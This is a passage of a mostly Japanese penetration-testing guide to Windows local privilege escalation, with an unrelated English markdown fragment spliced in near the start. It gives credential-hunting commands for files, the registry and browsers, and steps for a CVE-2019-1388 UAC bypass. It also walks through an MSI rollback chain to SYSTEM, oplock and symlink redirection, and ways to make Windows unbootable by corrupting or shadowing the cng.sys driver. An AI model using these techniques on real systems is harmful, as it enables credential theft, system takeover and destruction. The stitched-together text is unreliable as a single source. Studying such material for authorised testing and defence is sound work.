Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
```md
# Windows Local Privilege Escalation

Windows local privilege escalation techniques are used after getting an initial foothold in a Windows machine to obtain SYSTEM or Administrator privileges.

The techniques listed here are grouped by category and are not necessarily exhaustive.

> [!WARNING]
> Some of these techniques may be considered malicious if used without authorization. Only use them in environments where you have explicit permission.

## Basic Checks

Before trying specific techniques, always perform some basic enumeration:
- Current user and groups
- Privileges assigned to the current token
- Installed software and services
- Writable directories and files
- Scheduled tasks
- Running processes
- Misconfigurations in ACLs and permissions

## Common Techniques

- Unquoted service paths
- Service executable permissions
- AlwaysInstallElevated
- Hijacking autoruns
- DLL hijacking
- Token impersonation
- UAC bypasses
- Credential theft from memory or files
- Writable service binaries
- Weak service permissions
- Insecure scheduled tasks

## Useful Commands

```powershell
whoami /priv
whoami /groups
systeminfo
net user
net localgroup administrators
sc query
tasklist /svc
```

## Further Reading

- [Windows Privilege Escalation](../windows-privilege-escalation.md)
- [Windows Post-Exploitation](../windows-post-exploitation.md)
```
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### RecycleBin 内の Credentials

Bin も確認して、その中に credentials がないか探すべきです

複数のプログラムで保存された **passwords** を **recover** するには、次を使えます: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### registry 内

**credentials を含む他の可能性のある registry keys**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**レジストリから openssh keys を抽出する。**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### ブラウザ履歴

**Chrome** または **Firefox** に保存されているパスワードの dbs を確認すべきです。\
また、ブラウザの履歴、ブックマーク、favourites も確認してください。そこに **passwords are** 保存されている可能性があります。

ブラウザから password を抽出するツール:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** は、Windows OS に組み込まれた technology で、異なる言語の software components 間の **intercommunication** を可能にします。各 COM component は **class ID (CLSID)** によって識別され、各 component は 1 つ以上の interfaces を公開し、それらは interface IDs (IIDs) によって識別されます。

COM classes と interfaces は、それぞれレジストリの **HKEY\CLASSES\ROOT\CLSID** と **HKEY\CLASSES\ROOT\Interface** に定義されています。このレジストリは、**HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.** をマージすることで作成されます。

このレジストリの CLSID の中には child registry の **InProcServer32** があり、ここには **DLL** を指す **default value** と、**Apartment** (Single-Threaded)、**Free** (Multi-Threaded)、**Both** (Single or Multi)、または **Neutral** (Thread Neutral) になり得る **ThreadingModel** という値が含まれています。

![](<../../images/image (729).png>)

基本的に、実行される **DLLs** のいずれかを **overwrite** できるなら、その DLL が別のユーザーによって実行される場合に **privileges** を **escalate** できます。

攻撃者が persistence mechanism として COM Hijacking をどう使うかを学ぶには、こちらを参照してください:

{{#ref}}
com-hijacking.md
{{#endref}}

### **Generic Password search in files and registry**

**Search for file contents**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**特定のファイル名のファイルを検索する**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**レジストリでキー名とパスワードを検索する**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### パスワードを検索するツール

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **は msf** プラグインです。私はこのプラグインを作成し、**victim 内で credentials を検索するすべての metasploit POST module を自動的に実行**するようにしました。\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) は、このページで言及されているパスワードを含むすべてのファイルを自動的に検索します。\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) は、system から password を抽出するためのもう一つの優れたツールです。

ツール [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) は、平文でこのデータを保存するいくつかのツール（PuTTY、WinSCP、FileZilla、SuperPuTTY、RDP）の **sessions**、**usernames**、**passwords** を検索します。
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

**SYSTEM として動作するプロセスが新しいプロセス** (`OpenProcess()`) **を full access で開く** と想像してください。  
同じプロセスが **さらに新しいプロセス** (`CreateProcess()`) **を low privileges で作成しつつ、main process の open handles をすべて継承** します。\
その後、**low privileged process に full access** がある場合、`OpenProcess()` で作成された **privileged process への open handle** を取得でき、**shellcode を inject** できます。\
この脆弱性の **検出方法と exploit 方法** の詳細は、[この例を読んでください。](leaked-handle-exploitation.md)\
また、**異なる権限レベルで継承された process と thread のより多くの open handlers を test して abuse する方法** をより完全に説明した [**別の投稿**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/) もあります (**full access だけではありません**)。

## Named Pipe Client Impersonation

**pipes** と呼ばれる共有メモリセグメントは、process communication と data transfer を可能にします。

Windows は **Named Pipes** という機能を提供しており、無関係な processes が、異なるネットワーク上でも data を共有できるようにします。これは client/server architecture に似ており、役割は **named pipe server** と **named pipe client** として定義されます。

**client** が pipe 経由で data を送ると、その pipe をセットアップした **server** は、必要な **SeImpersonate** 権限があれば、**client の identity を引き受ける** ことができます。pipe を介して通信する **privileged process** を特定し、それを mimic できれば、その process があなたが作成した pipe とやり取りした際に、その identity を採用して **より高い privileges を得る**  अवसरがあります。こうした attack の実行方法については、役立つガイドを [**here**](named-pipe-client-impersonation.md) と [**here**](#from-high-integrity-to-system) で見つけられます。

また、以下の tool を使うと、**burp のような tool で named pipe communication を intercept** できます: [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **そしてこの tool は、privescs を見つけるためにすべての pipes を list して表示することもできます** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Telephony service (TapiSrv) の server mode は `\\pipe\\tapsrv` (MS-TRP) を公開します。remote authenticated client は mailslot ベースの async event path を abuse して `ClientAttach` を任意の **4-byte write** に変えられ、`NETWORK SERVICE` が書き込み可能な既存ファイルへ書き込み、その後 Telephony admin rights を得て、service として任意の DLL を load できます。全体の流れ:

- `pszDomainUser` を書き込み可能な既存パスに設定して `ClientAttach` → service はそれを `CreateFileW(..., OPEN_EXISTING)` で開き、async event writes に使用します。
- 各 event は `Initialize` の attacker-controlled な `InitContext` をその handle に書き込みます。`LRegisterRequestRecipient` (`Req_Func 61`) で line app を register し、`TRequestMakeCall` (`Req_Func 121`) を trigger し、`GetAsyncEvents` (`Req_Func 0`) で取得し、次に unregister/shutdown して deterministic writes を繰り返します。
- `C:\Windows\TAPI\tsec.ini` の `[TapiAdministrators]` に自分を追加して reconnect し、`GetUIDllName` に任意の DLL path を渡して `TSPI_providerUIIdentify` を `NETWORK SERVICE` として実行します。

詳細は以下:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### File Extensions that could execute stuff in Windows

ページ **[https://filesec.io/](https://filesec.io/)** を確認してください

### Protocol handler / ShellExecute abuse via Markdown renderers

`ShellExecuteExW` に forwarded される clickable Markdown links は、危険な URI handlers (`file:`, `ms-appinstaller:` など、または登録済みの scheme) を trigger し、current user として attacker-controlled files を execute できます。詳細は:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitoring Command Lines for passwords**

user として shell を取得した際、credentials を command line で渡す scheduled tasks や他の processes が実行されている場合があります。以下の script は、2秒ごとに process command lines を取得し、前回状態と比較して、差分を出力します。
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## プロセスからパスワードを盗む

## Low Priv User から NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

グラフィカルインターフェース（コンソールまたは RDP 経由）にアクセスでき、UAC が有効な場合、Microsoft Windows の一部のバージョンでは、権限のないユーザーから端末や、"NT\AUTHORITY SYSTEM" などの任意のプロセスを実行できる可能性があります。

これにより、同じ脆弱性を使って権限昇格と UAC バイパスを同時に行うことができます。さらに、何かをインストールする必要はなく、処理中に使用されるバイナリは Microsoft によって署名され、配布されています。

影響を受けるシステムの一部は以下のとおりです:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
この脆弱性を exploit するには、以下の手順を実行する必要があります:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
## Administrator MediumからHigh Integrity Levelへ / UAC Bypass

Integrity Levels について学ぶには、これを読んでください:


{{#ref}}
integrity-levels.md
{{#endref}}

それから、UAC と UAC bypass について学ぶには、これを読んでください:


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Arbitrary Folder Delete/Move/Rename から SYSTEM EoP へ

この手法は、[**このブログ記事**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) で説明されており、[**ここで入手可能な**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs) exploit code があります。

この攻撃は基本的に、Windows Installer の rollback 機能を悪用して、アンインストール処理中に正規ファイルを悪意あるファイルに置き換えるものです。そのために攻撃者は、`C:\Config.Msi` フォルダを hijack するための **malicious MSI installer** を作成する必要があります。後で Windows Installer が他の MSI パッケージのアンインストール時に rollback files を保存する際、その rollback files が改変されて malicious payload を含むようにします。

要約すると、手法は次のとおりです:

1. **Stage 1 – Hijack の準備 (`C:\Config.Msi` を空のままにする)**

- Step 1: MSI をインストールする
- `TARGETDIR` にある書き込み可能なフォルダへ無害なファイル（例: `dummy.txt`）をインストールする `.msi` を作成する。
- インストーラを **"UAC Compliant"** としてマークし、**non-admin user** が実行できるようにする。
- インストール後もファイルへの **handle** を開いたままにする。

- Step 2: Uninstall を開始する
- 同じ `.msi` をアンインストールする。
- uninstall プロセスはファイルを `C:\Config.Msi` へ移動し始め、`.rbf` files（rollback backups）へリネームする。
- `GetFinalPathNameByHandle` を使って開いている file handle を **poll** し、ファイルが `C:\Config.Msi\<random>.rbf` になった瞬間を検出する。

- Step 3: Custom Syncing
- `.msi` には **custom uninstall action (`SyncOnRbfWritten`)** が含まれており、これは:
- `.rbf` が書き込まれたことを通知する。
- その後、続行前に別の event を **wait** する。

- Step 4: `.rbf` の削除をブロックする
- 通知を受けたら、`FILE_SHARE_DELETE` なしで `.rbf` file を開く。これにより、**削除できなくなる**。
- その後、戻りの信号を送って uninstall を完了させる。
- Windows Installer は `.rbf` の削除に失敗し、すべての contents を削除できないため、**`C:\Config.Msi` は削除されない**。

- Step 5: `.rbf` を手動で削除する
- 攻撃者が `.rbf` file を手動で削除する。
- これで **`C:\Config.Msi` は空** になり、hijack の準備が整う。

> この時点で、**SYSTEM-level arbitrary folder delete vulnerability** を発動して `C:\Config.Msi` を削除します。

2. **Stage 2 – Rollback Scripts を悪意あるものに置き換える**

- Step 6: 弱い ACL で `C:\Config.Msi` を再作成する
- `C:\Config.Msi` フォルダを自分で再作成する。
- **weak DACLs**（例: Everyone:F）を設定し、`WRITE_DAC` を持ったまま **handle** を開いておく。

- Step 7: 別のインストールを実行する
- `.msi` を再度インストールする。設定は:
- `TARGETDIR`: 書き込み可能な場所。
- `ERROROUT`: 強制失敗を起こす変数。
- このインストールは、再び rollback を発生させるために使われ、`.rbs` と `.rbf` を読み込む。

- Step 8: `.rbs` を監視する
- `ReadDirectoryChangesW` を使って `C:\Config.Msi` を監視し、新しい `.rbs` が現れるまで待つ。
- その filename を取得する。

- Step 9: Rollback 前に同期する
- `.msi` には **custom install action (`SyncBeforeRollback`)** が含まれており、これは:
- `.rbs` が作成されたときに event を通知する。
- その後、続行前に **wait** する。

- Step 10: 弱い ACL を再適用する
- `.rbs created` event を受け取った後:
- Windows Installer は `C:\Config.Msi` に強い ACL を再適用する。
- しかし `WRITE_DAC` 付きの handle をまだ持っているので、再び **weak ACLs** を再適用できる。

> ACLs は **handle open 時にのみ enforced** されるため、フォルダへの書き込みを続けられます。

- Step 11: 偽の `.rbs` と `.rbf` を配置する
- `.rbs` file を、Windows に次を指示する **fake rollback script** で上書きする:
- あなたの `.rbf` file（malicious DLL）を **privileged location**（例: `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`）へ復元する。
- **malicious SYSTEM-level payload DLL** を含む偽の `.rbf` を配置する。

- Step 12: Rollback を発火させる
- sync event を送って installer を再開させる。
- **type 19 custom action (`ErrorOut`)** が、既知の時点でインストールを **意図的に失敗** させるよう設定されている。
- これにより **rollback が開始** される。

- Step 13: SYSTEM が DLL をインストールする
- Windows Installer は:
- 悪意ある `.rbs` を読み込む。
- `.rbf` DLL を target location にコピーする。
- これで **SYSTEM-loaded path** に malicious DLL が配置された。

- Final Step: SYSTEM Code を実行する
- 信頼された **auto-elevated binary**（例: `osk.exe`）を実行し、乗っ取った DLL を読み込ませる。
- **Boom**: コードが **SYSTEM として** 実行される。


### Arbitrary File Delete/Move/Rename から SYSTEM EoP へ

主要な MSI rollback technique（前述のもの）は、`C:\Config.Msi` のような **entire folder** を削除できることを前提にしています。では、vulnerability が **arbitrary file deletion** しか許さない場合はどうでしょうか？

**NTFS internals** を悪用できます。すべての folder には、次の hidden alternate data stream があります:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
この stream は、そのフォルダの **index metadata** を保存します。

そのため、フォルダの **`::$INDEX_ALLOCATION` stream を削除**すると、NTFS は filesystem から **フォルダ全体を削除**します。

これを行うには、次のような標準の file deletion APIs を使えます:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> *file* delete API を呼んでいるにもかかわらず、実際には**そのフォルダー自体を削除**します。

### Folder Contents Delete から SYSTEM EoP へ
もしその primitive で任意の file/folder を削除できないが、攻撃者が制御する folder の**内容の削除**はできる場合はどうでしょうか？

1. Step 1: bait folder と file を用意する
- 作成: `C:\temp\folder1`
- その中: `C:\temp\folder1\file1.txt`

2. Step 2: `file1.txt` に **oplock** を設定する
- 特権プロセスが `file1.txt` を削除しようとすると、oplock が**実行を一時停止**します。
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. ステップ 3: SYSTEMプロセスをトリガーする (例: `SilentCleanup`)
- このプロセスはフォルダ (例: `%TEMP%`) をスキャンし、その内容を削除しようとする。
- `file1.txt` に到達すると、**oplock がトリガー**され、制御があなたの callback に渡る。

4. ステップ 4: oplock callback 内で – 削除先をリダイレクトする

- Option A: `file1.txt` を別の場所へ移動する
- これにより oplock を壊さずに `folder1` を空にできる。
- `file1.txt` を直接削除しないこと — それをすると oplock が早すぎるタイミングで解除される。

- Option B: `folder1` を **junction** に変換する:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Option C: `\RPC Control` に **symlink** を作成する:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> これはフォルダのメタデータを保存する NTFS 内部ストリームを対象にしています — それを削除するとフォルダが削除されます。

5. Step 5: oplock を解放する
- SYSTEM プロセスは続行し、`file1.txt` の削除を試みます。
- しかし今では、junction + symlink により、実際には次を削除しています:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Result**: `C:\Config.Msi` は SYSTEM によって削除されます。

### 任意フォルダ作成から永続的 DoS へ

**ファイルを書き込めない**、または**弱い権限を設定できない**場合でも、**SYSTEM/admin として任意のフォルダを作成できる** プリミティブを悪用します。

**ファイル**ではなく**フォルダ**を作成し、**重要な Windows ドライバ**の名前を付けます。例:
```
C:\Windows\System32\cng.sys
```
- このパスは通常、`cng.sys` カーネルモードドライバに対応します。
- これを**あらかじめフォルダとして作成**すると、Windows は起動時に実際のドライバの読み込みに失敗します。
- その後、Windows は起動中に `cng.sys` を読み込もうとします。
- フォルダを検出し、**実際のドライバの解決に失敗**して、**クラッシュするか起動を停止**します。
- **フォールバックはなく**、外部からの介入（例: boot repair や disk access）なしには**回復できません**。

### privileged log/backup paths + OM symlinks から arbitrary file overwrite / boot DoS へ

**privileged service** が **writable config** から読み取ったパスへ log/export を書き込む場合、**Object Manager symlinks + NTFS mount points** でそのパスをリダイレクトし、privileged write を arbitrary overwrite に変えられます（**SeCreateSymbolicLinkPrivilege** なしでも可）。

**要件**
- ターゲットパスを保存する config が attacker により書き込み可能であること（例: `%ProgramData%\...\.ini`）。
- `\RPC Control` への mount point と OM file symlink を作成できること（James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)）。
- そのパスへ書き込む privileged operation があること（log, export, report）。

**例のチェーン**
1. config を読み取り、privileged log destination を復元する。例: `C:\ProgramData\ICONICS\IcoSetup64.ini` 内の `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt`。
2. admin なしでパスをリダイレクトする:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. 特権コンポーネントがログを書き込むのを待つ（例: 管理者が "send test SMS" をトリガーする）。この書き込みは `C:\Windows\System32\cng.sys` に入る。  
4. 上書きされた対象を確認する（hex/PE parser）して破損を確認する。再起動すると Windows は改ざんされた driver path を読み込もうとする → **boot loop DoS**。これは、特権 service が書き込み用に開く任意の保護されたファイルにも一般化できる。

> `cng.sys` は通常 `C:\Windows\System32\drivers\cng.sys` から読み込まれるが、`C:\Windows\System32\cng.sys` にコピーが存在するとそちらが先に試されるため、破損データの信頼できる DoS sink になる。



## **High Integrity から System へ**

### **新しい service**

すでに High Integrity process 上で動作しているなら、**SYSTEM への path** は、**新しい service を作成して実行する**だけで簡単な場合がある:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> service binary を作成する際は、それが有効な service であること、または binary が必要な処理をできるだけ素早く実行することを確認してください。そうしないと、正当な service でない場合 20s で kill されます。

### AlwaysInstallElevated

High Integrity process から **AlwaysInstallElevated registry entries を有効化**して、_**.msi**_ wrapper を使って reverse shell を **install** してみることができます。\
[関連する registry keys と _.msi_ package の install 方法の詳細はこちら。](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**コードはこちらを** [**参照してください**](seimpersonate-from-high-to-system.md)**。**

### From SeDebug + SeImpersonate to Full Token privileges

これらの token privileges があれば（おそらく既に High Integrity process で見つかるはずです）、SeDebug privilege を使って **ほぼ任意の process**（protected processes ではないもの）を開き、その process の **token を copy** し、その token で **任意の process を作成**できます。\
この technique では通常、**SYSTEM として動作し、すべての token privileges を持つ任意の process を選択**します（_はい、すべての token privileges を持たない SYSTEM process もあります_）。\
**この technique を実行する code の** [**例はこちら**](sedebug-+-seimpersonate-copy-token.md)**。**

### **Named Pipes**

この technique は meterpreter が `getsystem` で privilege escalation する際に使います。内容は、**pipe を作成し、その pipe に書き込む service を作成/abuse する**ことです。すると、**`SeImpersonate`** privilege を使って pipe を作成した **server** は pipe client（service）の **token を impersonate** でき、SYSTEM privileges を取得できます。\
name pipes について [**もっと学ぶにはこちらを読んでください**](#named-pipe-client-impersonation)。\
High Integrity から System へ name pipes を使って移行する例を読みたい場合は、[**こちらを読んでください**](from-high-integrity-to-system-with-name-pipes.md)。

### Dll Hijacking

**実行**される **SYSTEM** process が **load** する dll を **hijack** できれば、その権限で任意の code を実行できます。したがって Dll Hijacking もこの種の privilege escalation に有用です。さらに、High Integrity process からは dll を load する folder への **write permissions** を持つため、**はるかに実行しやすい**です。\
**Dll hijacking の詳細はこちら** [**で学べます**](dll-hijacking/index.html)**。**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Read:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Windows local privilege escalation vectors を探す最良の tool:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- misconfigurations と sensitive files をチェックします (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- 一部の misconfigurations をチェックし、情報を収集します (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- misconfigurations をチェックします**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY、WinSCP、SuperPuTTY、FileZilla、RDP の保存済み session 情報を抽出します。local では -Thorough を使用します。**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager から crendentials を抽出します。Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- 収集した password を domain 全体に spray します**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh は PowerShell の ADIDNS/LLMNR/mDNS spoofer および man-in-the-middle tool です。**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- 基本的な Windows privesc enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- 既知の privesc vulnerabilities を検索します（DEPRECATED for Watson）\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Local checks **(Need Admin rights)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- 既知の privesc vulnerabilities を検索します（VisualStudio を使って compile する必要があります）([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- misconfigurations を探して host を enumerate します（privesc というより情報収集 tool）(compile が必要) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- 多数の software から credentials を抽出します（github に precompiled exe あり）**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp の C# port**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- misconfiguration をチェックします（github に executable precompiled あり）。推奨しません。Win10 ではうまく動きません。\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- 可能性のある misconfigurations をチェックします（python から exe）。推奨しません。Win10 ではうまく動きません。

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- この post を元に作成された tool です（正しく動作させるのに accesschk は不要ですが、使用はできます）。

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** の出力を読み取り、動作する exploit を推奨します（local python）\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** の出力を読み取り、動作する exploit を推奨します（local python）

**Meterpreter**

_multi/recon/local_exploit_suggestor_

正しい version の .NET を使って project を compile する必要があります（[こちらを参照](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)）。victim host にインストールされている .NET version を確認するには、次を実行できます:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## References

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
